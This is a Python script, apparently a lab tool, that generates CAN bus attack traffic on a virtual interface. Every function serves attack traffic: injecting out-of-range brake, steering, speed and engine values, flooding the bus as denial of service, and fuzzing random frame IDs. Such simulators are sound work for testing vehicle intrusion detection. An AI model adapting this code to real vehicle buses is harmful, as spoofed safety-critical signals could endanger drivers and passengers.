#!/usr/bin/env python3
"""
CAN-Sentinel: Advanced Automotive Attack Simulator
Supports targeted injection, high-frequency DoS flooding, fuzzing,
and randomized adversarial traffic generation on vcan0.
"""

import sys
import time
import random
import argparse
import can

TARGET_MAP = {
    "engine": 0x101,
    "speed": 0x102,
    "brake": 0x103,
    "steering": 0x104,
    "temperature": 0x105,
}

def generate_payload(target):
    """Generates an anomalous payload for a specific ECU component."""
    if target == "engine":
        rpm = random.randint(7000, 9500)
        return bytes([(rpm >> 8) & 0xFF, rpm & 0xFF] + [0] * 6), f"RPM={rpm} (Redline Exceeded)"
    elif target == "speed":
        speed = random.randint(180, 255)
        return bytes([speed] + [0] * 7), f"Speed={speed} km/h (Excessive)"
    elif target == "brake":
        brake = random.randint(101, 255)
        return bytes([brake] + [0] * 7), f"Brake={brake}% (Invalid Sensor Value)"
    elif target == "steering":
        angle = random.randint(451, 900)
        return bytes([(angle >> 8) & 0xFF, angle & 0xFF] + [0] * 6), f"Angle={angle} deg (Severe Oversteer)"
    elif target == "temperature":
        temp = random.randint(150, 240)
        return bytes([temp] + [0] * 7), f"Temp={temp} C (Critical Overheating)"
    else:
        return bytes([random.randint(0, 255) for _ in range(8)]), "Fuzzed Payload"

def main():
    parser = argparse.ArgumentParser(description="CAN-Sentinel Automotive Cyberattack Simulator")
    parser.add_argument("--mode", choices=["random", "flood", "inject", "fuzz"], default="random",
                        help="Attack mode: random (default 1Hz), flood (DoS burst), inject (targeted), fuzz (random IDs)")
    parser.add_argument("--target", choices=["engine", "speed", "brake", "steering", "temperature", "all"], default="all",
                        help="Target ECU component (default: all)")
    parser.add_argument("--rate", type=float, default=None,
                        help="Attack frequency in Hz (default: 50.0 for flood, 1.0 for random/inject)")
    parser.add_argument("--count", type=int, default=0,
                        help="Number of attack packets to send (0 = infinite)")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Seconds to wait before launching the attack")
    args = parser.parse_args()

    if args.rate is None:
        rate = 50.0 if args.mode == "flood" else 1.0
    else:
        rate = args.rate

    sleep_interval = 1.0 / max(rate, 0.1)

    if args.delay > 0:
        print(f"[*] Attacker waiting {args.delay}s before engaging...")
        time.sleep(args.delay)

    print("=" * 60)
    print(f"       CAN-SENTINEL CYBERATTACK ENGAGED")
    print("=" * 60)
    print(f" Mode        : {args.mode.upper()}")
    print(f" Target      : {args.target.upper()}")
    print(f" Rate        : {rate:.1f} Hz (interval: {sleep_interval*1000:.1f}ms)")
    print(f" Limit       : {args.count if args.count > 0 else 'Continuous (Ctrl+C to stop)'}")
    print("=" * 60)

    try:
        bus = can.interface.Bus(channel="vcan0", interface="socketcan")
    except Exception as e:
        print(f"[-] Error connecting to vcan0: {e}")
        print("[i] Ensure vcan0 is active: sudo ip link set vcan0 up")
        sys.exit(1)

    sent = 0
    start_time = time.time()

    try:
        while True:
            if args.target == "all" or args.mode == "random":
                target_comp = random.choice(list(TARGET_MAP.keys()))
            else:
                target_comp = args.target

            if args.mode == "fuzz":
                can_id = random.randint(0x001, 0x7FF)
                payload, desc = generate_payload("fuzz")
            else:
                can_id = TARGET_MAP[target_comp]
                payload, desc = generate_payload(target_comp)

            msg = can.Message(arbitration_id=can_id, data=payload, is_extended_id=False)

            try:
                bus.send(msg)
                sent += 1
                if args.mode != "flood" or sent % 10 == 0 or sent <= 5:
                    print(f"[!] #{sent:04d} | ID: 0x{can_id:03X} | Target: {target_comp.capitalize():<11} | {desc}")
            except can.CanError as e:
                print(f"[-] Frame send error: {e}")

            if args.count > 0 and sent >= args.count:
                break

            time.sleep(sleep_interval)

    except KeyboardInterrupt:
        pass

    elapsed = time.time() - start_time
    print("\n" + "-" * 60)
    print(f"[+] Attack terminated.")
    print(f"    Total attack packets sent : {sent}")
    if elapsed > 0:
        print(f"    Attack duration           : {elapsed:.2f}s ({sent/elapsed:.1f} pkts/sec)")
    print("-" * 60)

if __name__ == "__main__":
    main()
